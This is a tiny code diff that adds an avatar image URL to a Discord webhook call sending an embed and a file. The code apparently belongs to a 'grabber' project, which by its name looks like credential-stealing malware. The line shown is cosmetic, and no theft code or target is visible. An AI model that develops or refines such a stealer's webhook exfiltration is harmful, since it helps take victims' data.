@@ -457,6 +457,7 @@ class Discord:
 
         webhook.send(
             embed=embed2,
+            avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
             file=file,
             username="Pyke")
 
